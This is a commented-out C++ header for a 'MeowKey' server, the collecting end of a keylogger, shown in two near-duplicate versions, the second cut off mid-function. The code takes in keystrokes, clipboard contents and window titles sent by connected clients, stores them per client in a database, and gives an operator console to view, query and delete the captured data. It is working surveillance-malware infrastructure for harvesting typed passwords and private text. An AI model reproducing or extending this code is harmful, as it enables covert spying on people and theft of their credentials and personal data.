

// // #ifndef SERVER_CROSS_HPP
// // #define SERVER_CROSS_HPP

// // #include "../socket_utils_cross.hpp"
// // #include "../meowkey_database.hpp"
// // #include <thread>
// // #include <atomic>
// // #include <unordered_map>
// // #include <mutex>
// // #include <deque>
// // #include <sstream>
// // #include <iostream>
// // #include <memory>
// // #include <iomanip>
// // #include <chrono>
// // #include <cstring>
// // #include <vector>

// // #ifdef _WIN32
// // #include <winsock2.h>
// // #else
// // #include <sys/socket.h>
// // #include <sys/types.h>
// // #include <fcntl.h>
// // #include <unistd.h>
// // #include <errno.h>
// // #endif

// // using namespace std;

// // /*
// //   server_cross.hpp
// //   - robust accept handshake (reads only first line using MSG_PEEK)
// //   - pending/active client flow (register on accept)
// //   - per-client handler: parse events, show on terminal, write into MeowKeyDatabase
// //   - safe shutdown, socket cleanup, db sync
// // */

// // class ClientHandler
// // {
// // private:
// //     int client_socket_;
// //     atomic<bool> running_;
// //     thread handler_thread_;
// //     string client_id_;
// //     uint32_t client_hash_;
// //     shared_ptr<MeowKeyDatabase> db_;

// //     deque<string> recent_events_;
// //     static mutex display_mutex_;

// //     void displayRecentEvents()
// //     {
// //         lock_guard<mutex> lock(display_mutex_);
// //         cout << "\n=== " << client_id_ << " " << string(max(0, 45 - (int)client_id_.length()), '-') << "===" << endl;
// //         if (recent_events_.empty())
// //         {
// //             cout << "| (No events yet)" << string(39, ' ') << "|" << endl;
// //         }
// //         else
// //         {
// //             for (const auto &e : recent_events_)
// //             {
// //                 string d = e.substr(0, 52);
// //                 cout << "| " << left << setw(52) << d << "|" << endl;
// //             }
// //         }
// //         cout << "==============================================================" << endl;
// //     }

// //     void pushRecent(const string &s)
// //     {
// //         lock_guard<mutex> lock(display_mutex_);
// //         recent_events_.push_back(s);
// //         if (recent_events_.size() > 20)
// //             recent_events_.pop_front();
// //     }

// //     void processEventLine(const string &line)
// //     {
// //         if (line.empty())
// //             return;

// //         uint64_t ts = MeowKeyDatabase::getCurrentTimestamp();

// //         // Normalize trimming
// //         size_t start = line.find_first_not_of(" \t\r\n");
// //         size_t end = line.find_last_not_of(" \t\r\n");
// //         string msg = (start==string::npos) ? string() : line.substr(start, end - start + 1);
// //         if (msg.empty()) return;

// //         // Old format: "KEY: X", "CLIPBOARD: data", "WINDOW: Title [Process]"
// //         try
// //         {
// //             if (msg.rfind("KEY:", 0) == 0 || msg.rfind("KEY: ", 0) == 0)
// //             {
// //                 string payload = msg.substr(msg.find(':') + 1);
// //                 if (!payload.empty() && payload[0] == ' ') payload.erase(0, 1);

// //                 KeystrokeEvent ke{};
// //                 ke.timestamp = ts;
// //                 ke.client_hash = client_hash_;
// //                 ke.sequence = 0;
// //                 strncpy(ke.key, payload.c_str(), sizeof(ke.key) - 1);
// //                 ke.key[sizeof(ke.key) - 1] = '\0';

// //                 db_->insertKeystroke(client_hash_, ke);

// //                 pushRecent("[KEY] " + payload);
// //             }
// //             else if (msg.rfind("CLIPBOARD:", 0) == 0 || msg.rfind("CLIPBOARD: ", 0) == 0)
// //             {
// //                 string payload = msg.substr(msg.find(':') + 1);
// //                 if (!payload.empty() && payload[0] == ' ') payload.erase(0, 1);

// //                 ClipboardEvent ce{};
// //                 ce.timestamp = ts;
// //                 ce.client_hash = client_hash_;
// //                 ce.content_length = (uint32_t)min((size_t)sizeof(ce.content), payload.size());
// //                 memset(ce.content, 0, sizeof(ce.content));
// //                 memcpy(ce.content, payload.data(), ce.content_length);

// //                 db_->insertClipboard(client_hash_, ce);

// //                 string truncated = payload.substr(0, 40);
// //                 if (payload.size() > 40) truncated += "...";
// //                 pushRecent("[CLIP] " + truncated);
// //             }
// //             else if (msg.rfind("WINDOW:", 0) == 0 || msg.rfind("WINDOW: ", 0) == 0)
// //             {
// //                 string payload = msg.substr(msg.find(':') + 1);
// //                 if (!payload.empty() && payload[0] == ' ') payload.erase(0, 1);

// //                 // Try to extract "Title [Process]" if present
// //                 string title = payload;
// //                 string process = "Unknown";
// //                 size_t br = payload.rfind(" [");
// //                 if (br != string::npos && payload.back() == ']')
// //                 {
// //                     title = payload.substr(0, br);
// //                     process = payload.substr(br + 2, payload.size() - br - 3);
// //                 }

// //                 WindowEvent we{};
// //                 we.timestamp = ts;
// //                 we.client_hash = client_hash_;
// //                 strncpy(we.title, title.c_str(), sizeof(we.title) - 1);
// //                 we.title[sizeof(we.title) - 1] = '\0';
// //                 strncpy(we.process, process.c_str(), sizeof(we.process) - 1);
// //                 we.process[sizeof(we.process) - 1] = '\0';

// //                 db_->insertWindow(client_hash_, we);

// //                 string truncated = title.substr(0, 40);
// //                 if (title.size() > 40) truncated += "...";
// //                 pushRecent("[WIN] " + truncated);
// //             }
// //             else
// //             {
// //                 // Fallback: try treat as keystroke text
// //                 KeystrokeEvent ke{};
// //                 ke.timestamp = ts;
// //                 ke.client_hash = client_hash_;
// //                 ke.sequence = 0;
// //                 strncpy(ke.key, msg.c_str(), sizeof(ke.key) - 1);
// //                 ke.key[sizeof(ke.key) - 1] = '\0';
// //                 db_->insertKeystroke(client_hash_, ke);
// //                 pushRecent("[KEY] " + msg);
// //             }

// //             displayRecentEvents();
// //         }
// //         catch (const exception &e)
// //         {
// //             cerr << "Error processing event for " << client_id_ << ": " << e.what() << endl;
// //         }
// //     }

// //     // Thread main: read lines, process each
// //     void clientLoop()
// //     {
// //         char buf[4096];
// //         string leftover;
// //         while (running_)
// //         {
// //             ssize_t r = recv(client_socket_, buf, sizeof(buf) - 1, 0);
// //             if (r <= 0)
// //                 break;
// //             buf[r] = '\0';
// //             string data = leftover + string(buf);
// //             leftover.clear();

// //             istringstream ss(data);
// //             string line;
// //             while (getline(ss, line))
// //             {
// //                 bool had_newline = (!ss.fail());
// //                 if (!ss.eof() && ss.fail()) // shouldn't happen
// //                     had_newline = true;

// //                 // If last chunk doesn't end with newline, save leftover
// //                 if (ss.eof() && data.back() != '\n')
// //                 {
// //                     leftover = line;
// //                     break;
// //                 }

// //                 if (!line.empty())
// //                     processEventLine(line);
// //             }
// //         }

// //         // Final flush / sync
// //         cout << "\n🔄 [Final flush] All buffers for " << client_id_ << endl;
// //         if (db_) db_->syncToDisk();

// //         cout << "⚠️  Client " << client_id_ << " fully disconnected" << endl;
// //     }

// // public:
// //     ClientHandler(int sock, const string &id, shared_ptr<MeowKeyDatabase> db)
// //         : client_socket_(sock), running_(false), client_id_(id), db_(db)
// //     {
// //         client_hash_ = ClientRecord::hashString(client_id_);
// //     }

// //     ~ClientHandler()
// //     {
// //         stop();
// //     }

// //     void start()
// //     {
// //         running_ = true;
// //         handler_thread_ = thread([this] { clientLoop(); });
// //     }

// //     void stop()
// //     {
// //         if (!running_) return;
// //         running_ = false;
// // #ifdef _WIN32
// //         shutdown(client_socket_, SD_BOTH);
// //         closesocket(client_socket_);
// // #else
// //         shutdown(client_socket_, SHUT_RDWR);
// //         close(client_socket_);
// // #endif
// //         client_socket_ = -1;
// //         if (handler_thread_.joinable())
// //             handler_thread_.join();
// //         cout << "[Client handler stopped: " << client_id_ << "]" << endl;
// //     }

// //     int getSocket() const { return client_socket_; }
// //     string getClientId() const { return client_id_; }
// //     bool isRunning() const { return running_; }
// // };

// // mutex ClientHandler::display_mutex_;

// // class Server
// // {
// // private:
// //     int port_;
// //     int server_socket_;
// //     atomic<bool> running_;
// //     thread accept_thread_;

// //     unordered_map<string, unique_ptr<ClientHandler>> pending_clients_;
// //     unordered_map<string, unique_ptr<ClientHandler>> active_clients_;
// //     mutex clients_mutex_;

// //     shared_ptr<MeowKeyDatabase> db_;
// //     string storage_file_;

// //     // Read a single line from socket without consuming subsequent bytes:
// //     // uses MSG_PEEK to find newline, then consumes only that line.
// //     // Returns empty string on error.
// //     string readHandshakeLine(int sock, int timeout_ms = 2000)
// //     {
// // #ifdef _WIN32
// //         // Simple fallback for Windows: read up to first newline (may consume extra)
// //         char tmp[1024];
// //         int r = recv(sock, tmp, sizeof(tmp) - 1, 0);
// //         if (r <= 0) return string();
// //         tmp[r] = '\0';
// //         string s(tmp);
// //         size_t nl = s.find_first_of("\r\n");
// //         if (nl != string::npos) s = s.substr(0, nl);
// //         return s;
// // #else
// //         const int max_peek = 4096;
// //         vector<char> peekbuf(max_peek + 1);
// //         auto start = chrono::steady_clock::now();
// //         while (true)
// //         {
// //             ssize_t pr = recv(sock, peekbuf.data(), max_peek, MSG_PEEK);
// //             if (pr < 0)
// //             {
// //                 if (errno == EAGAIN || errno == EWOULDBLOCK)
// //                 {
// //                     // wait small
// //                     this_thread::sleep_for(chrono::milliseconds(50));
// //                     if (chrono::duration_cast<chrono::milliseconds>(chrono::steady_clock::now() - start).count() > timeout_ms)
// //                         return string();
// //                     continue;
// //                 }
// //                 return string();
// //             }
// //             if (pr == 0) return string();

// //             peekbuf[pr] = '\0';
// //             string s(peekbuf.data(), (size_t)pr);
// //             size_t nl = s.find_first_of("\r\n");
// //             if (nl == string::npos)
// //             {
// //                 // Not yet complete line, wait slightly
// //                 this_thread::sleep_for(chrono::milliseconds(50));
// //                 if (chrono::duration_cast<chrono::milliseconds>(chrono::steady_clock::now() - start).count() > timeout_ms)
// //                     return string();
// //                 continue;
// //             }

// //             // consume exactly nl+1 bytes (handle CRLF)
// //             size_t consume = nl + 1;
// //             // If CRLF and next char is '\n' adjust consume
// //             if (nl + 1 < (size_t)pr && peekbuf[nl] == '\r' && peekbuf[nl + 1] == '\n')
// //                 consume = nl + 2;

// //             vector<char> linebuf(consume + 1);
// //             ssize_t cr = recv(sock, linebuf.data(), (ssize_t)consume, 0); // actually consume
// //             if (cr <= 0) return string();
// //             linebuf[cr] = '\0';
// //             string line(linebuf.data(), (size_t)cr);
// //             // strip newline
// //             while (!line.empty() && (line.back() == '\n' || line.back() == '\r')) line.pop_back();
// //             return line;
// //         }
// // #endif
// //     }

// //     void handleNewConnectionSocket(int client_sock, const string &client_id)
// //     {
// //         lock_guard<mutex> lock(clients_mutex_);
// //         if (pending_clients_.count(client_id) || active_clients_.count(client_id))
// //         {
// //             cout << "\n❌ Client " << client_id << " already connected!" << endl;
// //             string msg = "ERROR: Already connected\n";
// //             send(client_sock, msg.c_str(), (int)msg.size(), 0);
// // #ifdef _WIN32
// //             closesocket(client_sock);
// // #else
// //             close(client_sock);
// // #endif
// //             return;
// //         }

// //         cout << "\n🔔 ═══════════════════════════════════════════════════════════" << endl;
// //         cout << "   NEW CONNECTION REQUEST" << endl;
// //         cout << "   Client ID: " << client_id << endl;
// //         cout << "   Status: " << (db_->clientExists(client_id) ? "RETURNING" : "NEW") << endl;
// //         cout << "   ═══════════════════════════════════════════════════════════" << endl;
// //         cout << "   Action: accept " << client_id << " | reject " << client_id << endl;
// //         cout << "   ═══════════════════════════════════════════════════════════\n"
// //              << endl;

// //         pending_clients_[client_id] = make_unique<ClientHandler>(client_sock, client_id, db_);
// //     }

// // public:
// //     Server(int port, const string &storage_file = "meowkey_server.db")
// //         : port_(port), server_socket_(-1), running_(false), storage_file_(storage_file)
// //     {
// //         db_ = make_shared<MeowKeyDatabase>(storage_file_);
// //         if (!db_->open())
// //             throw runtime_error("Failed to open database: " + storage_file_);
// //         cout << "✅ Database opened: " << storage_file_ << endl;
// //     }

// //     ~Server()
// //     {
// //         stop();
// //     }

// //     bool start()
// //     {
// //         if (running_) return false;
// //         running_ = true;
// //         accept_thread_ = thread(&Server::acceptLoop, this);
// //         printBanner();
// //         return true;
// //     }

// //     void stop()
// //     {
// //         cout << "\n⏹️  Shutting down server..." << endl;
// //         running_ = false;

// //         if (server_socket_ >= 0)
// //         {
// // #ifdef _WIN32
// //             closesocket(server_socket_);
// // #else
// //             shutdown(server_socket_, SHUT_RDWR);
// //             close(server_socket_);
// // #endif
// //             server_socket_ = -1;
// //         }

// //         if (accept_thread_.joinable()) accept_thread_.join();

// //         {
// //             lock_guard<mutex> lock(clients_mutex_);
// //             for (auto &p : active_clients_) p.second->stop();
// //             active_clients_.clear();
// //             for (auto &p : pending_clients_) p.second->stop();
// //             pending_clients_.clear();
// //         }

// //         if (db_) { db_->syncToDisk(); db_->close(); }
// //         SocketUtils::cleanupWSA();
// //         cout << "✅ Server shutdown complete" << endl;
// //     }

// //     void runCommandLoop()
// //     {
// //         string line;
// //         while (running_)
// //         {
// //             cout << "meowkey> ";
// //             if (!getline(cin, line)) break;
// //             if (line.empty()) continue;
// //             processCommand(line);
// //         }
// //     }

// //     void processCommand(const string &cmd)
// //     {
// //         istringstream iss(cmd);
// //         string c; iss >> c;
// //         if (c == "accept")
// //         {
// //             string id;
// //             if (iss >> id)
// //                 acceptClient(id);
// //             else
// //             {
// //                 lock_guard<mutex> lock(clients_mutex_);
// //                 if (pending_clients_.size() == 1)
// //                 {
// //                     string only = pending_clients_.begin()->first;
// //                     cout << "Auto-accepting pending client: " << only << endl;
// //                     acceptClient(only);
// //                 }
// //                 else
// //                 {
// //                     cout << "Usage: accept <client_id>" << endl;
// //                 }
// //             }
// //         }
// //         else if (c == "reject")
// //         {
// //             string id; if (iss >> id) rejectClient(id); else cout << "Usage: reject <id>" << endl;
// //         }
// //         else if (c == "kick")
// //         {
// //             string id; if (iss >> id) kickClient(id); else cout << "Usage: kick <id>" << endl;
// //         }
// //         else if (c == "list") listClients();
// //         else if (c == "clients") showAllClients();
// //         else if (c == "view")
// //         {
// //             string id, type="all";
// //             if (iss >> id) { if (iss >> type) ; viewClientData(id, type); }
// //             else cout << "Usage: view <client_id> [all|ks|clip|win]" << endl;
// //         }
// //         else if (c == "flush")
// //         {
// //             string id;
// //             if (iss >> id) flushClient(id); else flushAllClients();
// //         }
// //         else if (c == "delete")
// //         {
// //             string id; if (iss >> id) deleteClient(id); else cout << "Usage: delete <id>" << endl;
// //         }
// //         else if (c == "stats") showStats();
// //         else if (c == "range")
// //         {
// //             string id; uint64_t s,e;
// //             if (iss >> id >> s >> e) viewRangedData(id,s,e);
// //             else cout << "Usage: range <id> <start> <end>" << endl;
// //         }
// //         else if (c == "help") printBanner();
// //         else if (c == "quit" || c == "exit") stop();
// //         else cout << "Unknown command. Type 'help'." << endl;
// //     }

// // private:
// //     void printBanner()
// //     {
// //         cout << "\n╔═══════════════════════════════════════════════════════════╗" << endl;
// //         cout << "║        🐱 MEOWKEY SERVER - LIVE MONITORING 🐱             ║" << endl;
// //         cout << "╠═══════════════════════════════════════════════════════════╣" << endl;
// //         cout << "║ Status: RUNNING                                           ║" << endl;
// //         cout << "║ Port: " << port_ << "                                              ║" << endl;
// //         cout << "║ Database: " << storage_file_ << " (B+ Tree with Hash Table)  ║" << endl;
// //         cout << "╠═══════════════════════════════════════════════════════════╣" << endl;
// //         cout << "║ COMMANDS:                                                 ║" << endl;
// //         cout << "║   accept <id>      - Accept pending client                ║" << endl;
// //         cout << "║   reject <id>      - Reject pending client                ║" << endl;
// //         cout << "║   kick <id>        - Disconnect active client             ║" << endl;
// //         cout << "║   list             - Show active/pending clients          ║" << endl;
// //         cout << "║   clients          - Show all registered clients          ║" << endl;
// //         cout << "║   view <id> <type> - View client data (ks/clip/win/all)   ║" << endl;
// //         cout << "║   range <id> s e   - Time range query (microseconds)     ║" << endl;
// //         cout << "║   flush [id]       - Flush buffers (all or specific)      ║" << endl;
// //         cout << "║   delete <id>      - Delete client and all data           ║" << endl;
// //         cout << "║   stats            - Show database statistics             ║" << endl;
// //         cout << "║   help             - Show this help                      ║" << endl;
// //         cout << "║   quit             - Stop server                         ║" << endl;
// //         cout << "╚═══════════════════════════════════════════════════════════╝\n" << endl;
// //     }

// //     void acceptLoop()
// //     {
// //         try
// //         {
// //             server_socket_ = SocketUtils::createSocket();
// // #ifndef _WIN32
// //             int flags = fcntl(server_socket_, F_GETFL, 0);
// //             fcntl(server_socket_, F_SETFL, flags | O_NONBLOCK);
// // #endif
// //             SocketUtils::bindSocket(server_socket_, port_);
// //             SocketUtils::listenSocket(server_socket_);
// //             cout << "🔊 Listening on port " << port_ << "...\n" << endl;

// //             while (running_)
// //             {
// //                 int client_sock = accept(server_socket_, nullptr, nullptr);
// //                 if (client_sock < 0)
// //                 {
// // #ifndef _WIN32
// //                     if (errno == EAGAIN || errno == EWOULDBLOCK)
// //                     {
// //                         this_thread::sleep_for(chrono::milliseconds(50));
// //                         continue;
// //                     }
// // #endif
// //                     // other errors may break loop
// //                     this_thread::sleep_for(chrono::milliseconds(50));
// //                     continue;
// //                 }

// //                 // read handshake line carefully
// //                 string line = readHandshakeLine(client_sock, 1500);
// //                 if (line.empty())
// //                 {
// //                     // invalid handshake
// // #ifdef _WIN32
// //                     closesocket(client_sock);
// // #else
// //                     close(client_sock);
// // #endif
// //                     continue;
// //                 }

// //                 // accept formats: "CLIENT_ID: 001" or "CLIENT_ID:001"
// //                 string id;
// //                 size_t col = line.find(':');
// //                 if (col != string::npos)
// //                 {
// //                     id = line.substr(col + 1);
// //                 }
// //                 else
// //                 {
// //                     id = line;
// //                 }
// //                 // trim
// //                 size_t st = id.find_first_not_of(" \t\r\n");
// //                 size_t ed = id.find_last_not_of(" \t\r\n");
// //                 if (st == string::npos) id.clear();
// //                 else id = id.substr(st, ed - st + 1);

// //                 if (id.empty())
// //                 {
// // #ifdef _WIN32
// //                     closesocket(client_sock);
// // #else
// //                     close(client_sock);
// // #endif
// //                     continue;
// //                 }

// //                 handleNewConnectionSocket(client_sock, id);
// //             }
// //         }
// //         catch (const exception &e)
// //         {
// //             if (running_) cerr << "❌ Accept loop error: " << e.what() << endl;
// //         }
// //     }

// //     void acceptClient(const string &client_id)
// //     {
// //         lock_guard<mutex> lock(clients_mutex_);
// //         auto it = pending_clients_.find(client_id);
// //         if (it == pending_clients_.end())
// //         {
// //             cout << "❌ Client '" << client_id << "' not in pending list!" << endl;
// //             return;
// //         }

// //         auto handler = move(it->second);
// //         pending_clients_.erase(it);

// //         ClientRecord rec;
// //         bool existing = db_->registerClient(client_id, rec); // registers and caches
// //         // send approval
// //         string msg = "APPROVED\n";
// //         send(handler->getSocket(), msg.c_str(), (int)msg.size(), 0);

// //         db_->syncToDisk(); // ensure record persisted

// //         handler->start();
// //         active_clients_[client_id] = move(handler);

// //         cout << "✅ Client accepted: " << client_id << endl;
// //     }

// //     void rejectClient(const string &client_id)
// //     {
// //         lock_guard<mutex> lock(clients_mutex_);
// //         auto it = pending_clients_.find(client_id);
// //         if (it == pending_clients_.end())
// //         {
// //             cout << "❌ Client '" << client_id << "' not in pending list!" << endl;
// //             return;
// //         }
// //         auto handler = move(it->second);
// //         pending_clients_.erase(it);
// //         string msg = "REJECTED\n";
// //         send(handler->getSocket(), msg.c_str(), (int)msg.size(), 0);
// //         handler->stop();
// //         cout << "❌ Client rejected: " << client_id << endl;
// //     }

// //     void kickClient(const string &client_id)
// //     {
// //         lock_guard<mutex> lock(clients_mutex_);
// //         auto it = active_clients_.find(client_id);
// //         if (it != active_clients_.end())
// //         {
// //             it->second->stop();
// //             active_clients_.erase(it);
// //             cout << "✅ Client kicked: " << client_id << endl;
// //             return;
// //         }
// //         it = pending_clients_.find(client_id);
// //         if (it != pending_clients_.end())
// //         {
// //             it->second->stop();
// //             pending_clients_.erase(it);
// //             cout << "✅ Pending client removed: " << client_id << endl;
// //             return;
// //         }
// //         cout << "❌ Client not found!" << endl;
// //     }

// //     void listClients()
// //     {
// //         lock_guard<mutex> lock(clients_mutex_);
// //         cout << "\nPENDING (" << pending_clients_.size() << "):" << endl;
// //         if (pending_clients_.empty()) cout << "  (none)\n";
// //         else for (auto &p : pending_clients_) cout << "  " << p.first << endl;
// //         cout << "\nACTIVE (" << active_clients_.size() << "):" << endl;
// //         if (active_clients_.empty()) cout << "  (none)\n";
// //         else for (auto &p : active_clients_) cout << "  " << p.first << endl;
// //     }

// //     void showAllClients()
// //     {
// //         auto clients = db_->getAllClients();
// //         cout << "\nALL REGISTERED CLIENTS IN DATABASE:" << endl;
// //         if (clients.empty()) { cout << "  (no clients in database)\n"; return; }
// //         for (auto &c : clients)
// //         {
// //             ClientRecord r;
// //             db_->getClientStats(c, r);
// //             cout << "  * " << c << " | Sessions: " << r.session_count
// //                  << " KS:" << r.total_keystrokes << " CB:" << r.total_clipboard << " W:" << r.total_windows << endl;
// //         }
// //     }

// //     void viewClientData(const string &client_id, const string &type)
// //     {
// //         if (!db_->clientExists(client_id))
// //         {
// //             cout << "❌ Client '" << client_id << "' not found!" << endl;
// //             return;
// //         }
// //         QueryResult res;
// //         if (!db_->queryClientAllEvents(client_id, res))
// //         {
// //             cout << "❌ Failed to query client data!" << endl;
// //             return;
// //         }

// //         cout << "\nDATA FOR CLIENT: " << client_id << endl;
// //         if (type == "all" || type == "keystroke" || type == "ks")
// //         {
// //             cout << "\nKEYSTROKES (" << res.keystrokes.size() << "):\n";
// //             for (size_t i = 0; i < res.keystrokes.size(); ++i)
// //             {
// //                 cout << "  " << (i+1) << ". [" << res.keystrokes[i].timestamp << "] " << res.keystrokes[i].key << "\n";
// //             }
// //         }
// //         if (type == "all" || type == "clipboard" || type == "clip")
// //         {
// //             cout << "\nCLIPBOARD (" << res.clipboard_events.size() << "):\n";
// //             for (size_t i = 0; i < res.clipboard_events.size(); ++i)
// //             {
// //                 string s(res.clipboard_events[i].content, res.clipboard_events[i].content_length);
// //                 cout << "  " << (i+1) << ". [" << res.clipboard_events[i].timestamp << "] " << s << "\n";
// //             }
// //         }
// //         if (type == "all" || type == "window" || type == "win")
// //         {
// //             cout << "\nWINDOWS (" << res.window_events.size() << "):\n";
// //             for (size_t i = 0; i < res.window_events.size(); ++i)
// //             {
// //                 cout << "  " << (i+1) << ". [" << res.window_events[i].timestamp << "] "
// //                      << res.window_events[i].title << " [" << res.window_events[i].process << "]\n";
// //             }
// //         }
// //     }

// //     void viewRangedData(const string &client_id, uint64_t start_ts, uint64_t end_ts)
// //     {
// //         if (!db_->clientExists(client_id)) { cout << "❌ Client not found!\n"; return; }
// //         QueryResult res;
// //         if (!db_->queryClientEventsByTimeRange(client_id, start_ts, end_ts, res)) { cout << "❌ Query failed!\n"; return; }
// //         cout << "Range results: Total=" << res.totalEvents() << " KS=" << res.keystrokes.size()
// //              << " CB=" << res.clipboard_events.size() << " W=" << res.window_events.size() << endl;
// //     }

// //     void flushClient(const string &client_id)
// //     {
// //         lock_guard<mutex> lock(clients_mutex_);
// //         auto it = active_clients_.find(client_id);
// //         if (it != active_clients_.end())
// //         {
// //             // active handler flush is handled by handler reading; ensure db sync
// //             db_->syncToDisk();
// //             cout << "Flushed client: " << client_id << endl;
// //             return;
// //         }
// //         cout << "Client not active!" << endl;
// //     }

// //     void flushAllClients()
// //     {
// //         db_->syncToDisk();
// //         cout << "Flushed DB to disk." << endl;
// //     }

// //     void deleteClient(const string &client_id)
// //     {
// //         kickClient(client_id);
// //         if (db_->deleteClient(client_id)) cout << "Deleted client: " << client_id << endl;
// //         else cout << "Delete failed or client not present." << endl;
// //     }

// //     void showStats()
// //     {
// //         db_->printStats();
// //     }
// // };

// // #endif

// // #ifndef SERVER_CROSS_HPP
// // #define SERVER_CROSS_HPP

// // #include "../socket_utils_cross.hpp"
// // #include "../meowkey_database.hpp"
// // #include <thread>
// // #include <atomic>
// // #include <unordered_map>
// // #include <mutex>
// // #include <deque>
// // #include <sstream>
// // #include <iostream>
// // #include <memory>
// // #include <iomanip>
// // #include <chrono>
// // #include <cstring>
// // #include <vector>

// // #ifdef _WIN32
// // #include <winsock2.h>
// // #else
// // #include <sys/socket.h>
// // #include <sys/types.h>
// // #include <fcntl.h>
// // #include <unistd.h>
// // #include <errno.h>
// // #endif

// // using namespace std;

// // class ClientHandler
// // {
// // private:
// //     int client_socket_;
// //     atomic<bool> running_;
// //     thread handler_thread_;
// //     string client_id_;
// //     uint32_t client_hash_;
// //     shared_ptr<MeowKeyDatabase> db_;
// //     deque<string> recent_events_;
// //     static mutex display_mutex_;

// //     // Counter for periodic sync
// //     atomic<int> events_since_sync_;
// //     static const int SYNC_INTERVAL = 10; // Sync every 10 events

// //     void displayRecentEvents()
// //     {
// //         lock_guard<mutex> lock(display_mutex_);
// //         cout << "\n=== " << client_id_ << " " << string(max(0, 45 - (int)client_id_.length()), '-') << "===" << endl;
// //         if (recent_events_.empty())
// //         {
// //             cout << "| (No events yet)" << string(39, ' ') << "|" << endl;
// //         }
// //         else
// //         {
// //             for (const auto &e : recent_events_)
// //             {
// //                 string d = e.substr(0, 52);
// //                 cout << "| " << left << setw(52) << d << "|" << endl;
// //             }
// //         }
// //         cout << "==============================================================" << endl;
// //     }

// //     void pushRecent(const string &s)
// //     {
// //         lock_guard<mutex> lock(display_mutex_);
// //         recent_events_.push_back(s);
// //         if (recent_events_.size() > 20)
// //             recent_events_.pop_front();
// //     }

// //     void processEventLine(const string &line)
// //     {
// //         if (line.empty())
// //             return;

// //         uint64_t ts = MeowKeyDatabase::getCurrentTimestamp();

// //         // Normalize trimming
// //         size_t start = line.find_first_not_of(" \t\r\n");
// //         size_t end = line.find_last_not_of(" \t\r\n");
// //         string msg = (start==string::npos) ? string() : line.substr(start, end - start + 1);
// //         if (msg.empty()) return;

// //         try
// //         {
// //             if (msg.rfind("KEY:", 0) == 0 || msg.rfind("KEY: ", 0) == 0)
// //             {
// //                 string payload = msg.substr(msg.find(':') + 1);
// //                 if (!payload.empty() && payload[0] == ' ') payload.erase(0, 1);

// //                 KeystrokeEvent ke{};
// //                 ke.timestamp = ts;
// //                 ke.client_hash = client_hash_;
// //                 ke.sequence = 0;
// //                 strncpy(ke.key, payload.c_str(), sizeof(ke.key) - 1);
// //                 ke.key[sizeof(ke.key) - 1] = '\0';

// //                 db_->insertKeystroke(client_hash_, ke);
// //                 pushRecent("[KEY] " + payload);
// //             }
// //             else if (msg.rfind("CLIPBOARD:", 0) == 0 || msg.rfind("CLIPBOARD: ", 0) == 0)
// //             {
// //                 string payload = msg.substr(msg.find(':') + 1);
// //                 if (!payload.empty() && payload[0] == ' ') payload.erase(0, 1);

// //                 ClipboardEvent ce{};
// //                 ce.timestamp = ts;
// //                 ce.client_hash = client_hash_;
// //                 ce.content_length = (uint32_t)min((size_t)sizeof(ce.content), payload.size());
// //                 memset(ce.content, 0, sizeof(ce.content));
// //                 memcpy(ce.content, payload.data(), ce.content_length);

// //                 db_->insertClipboard(client_hash_, ce);

// //                 string truncated = payload.substr(0, 40);
// //                 if (payload.size() > 40) truncated += "...";
// //                 pushRecent("[CLIP] " + truncated);
// //             }
// //             else if (msg.rfind("WINDOW:", 0) == 0 || msg.rfind("WINDOW: ", 0) == 0)
// //             {
// //                 string payload = msg.substr(msg.find(':') + 1);
// //                 if (!payload.empty() && payload[0] == ' ') payload.erase(0, 1);

// //                 string title = payload;
// //                 string process = "Unknown";
// //                 size_t br = payload.rfind(" [");
// //                 if (br != string::npos && payload.back() == ']')
// //                 {
// //                     title = payload.substr(0, br);
// //                     process = payload.substr(br + 2, payload.size() - br - 3);
// //                 }

// //                 WindowEvent we{};
// //                 we.timestamp = ts;
// //                 we.client_hash = client_hash_;
// //                 strncpy(we.title, title.c_str(), sizeof(we.title) - 1);
// //                 we.title[sizeof(we.title) - 1] = '\0';
// //                 strncpy(we.process, process.c_str(), sizeof(we.process) - 1);
// //                 we.process[sizeof(we.process) - 1] = '\0';

// //                 db_->insertWindow(client_hash_, we);

// //                 string truncated = title.substr(0, 40);
// //                 if (title.size() > 40) truncated += "...";
// //                 pushRecent("[WIN] " + truncated);
// //             }
// //             else
// //             {
// //                 // Fallback: keystroke
// //                 KeystrokeEvent ke{};
// //                 ke.timestamp = ts;
// //                 ke.client_hash = client_hash_;
// //                 ke.sequence = 0;
// //                 strncpy(ke.key, msg.c_str(), sizeof(ke.key) - 1);
// //                 ke.key[sizeof(ke.key) - 1] = '\0';
// //                 db_->insertKeystroke(client_hash_, ke);
// //                 pushRecent("[KEY] " + msg);
// //             }

// //             displayRecentEvents();

// //             // CRITICAL: Periodic sync every N events
// //             events_since_sync_++;
// //             if (events_since_sync_ >= SYNC_INTERVAL)
// //             {
// //                 cout << "🔄 [Auto-sync] Flushing to disk after " << SYNC_INTERVAL << " events" << endl;
// //                 db_->syncToDisk();
// //                 events_since_sync_ = 0;
// //             }
// //         }
// //         catch (const exception &e)
// //         {
// //             cerr << "Error processing event for " << client_id_ << ": " << e.what() << endl;
// //         }
// //     }

// //     void clientLoop()
// //     {
// //         char buf[4096];
// //         string leftover;
// //         while (running_)
// //         {
// //             ssize_t r = recv(client_socket_, buf, sizeof(buf) - 1, 0);
// //             if (r <= 0)
// //                 break;
// //             buf[r] = '\0';
// //             string data = leftover + string(buf);
// //             leftover.clear();

// //             istringstream ss(data);
// //             string line;
// //             while (getline(ss, line))
// //             {
// //                 if (ss.eof() && data.back() != '\n')
// //                 {
// //                     leftover = line;
// //                     break;
// //                 }

// //                 if (!line.empty())
// //                     processEventLine(line);
// //             }
// //         }

// //         // CRITICAL: Final flush on disconnect
// //         cout << "\n🔄 [Final flush] Syncing all data for " << client_id_ << endl;
// //         db_->syncToDisk();
// //         cout << "⚠️  Client " << client_id_ << " disconnected and data persisted" << endl;
// //     }

// // public:
// //     ClientHandler(int sock, const string &id, shared_ptr<MeowKeyDatabase> db)
// //         : client_socket_(sock), running_(false), client_id_(id), db_(db), events_since_sync_(0)
// //     {
// //         client_hash_ = ClientRecord::hashString(client_id_);
// //     }

// //     ~ClientHandler()
// //     {
// //         stop();
// //     }

// //     void start()
// //     {
// //         running_ = true;
// //         handler_thread_ = thread([this] { clientLoop(); });
// //     }

// //     void stop()
// //     {
// //         if (!running_) return;
// //         running_ = false;
// // #ifdef _WIN32
// //         shutdown(client_socket_, SD_BOTH);
// //         closesocket(client_socket_);
// // #else
// //         shutdown(client_socket_, SHUT_RDWR);
// //         close(client_socket_);
// // #endif
// //         client_socket_ = -1;
// //         if (handler_thread_.joinable())
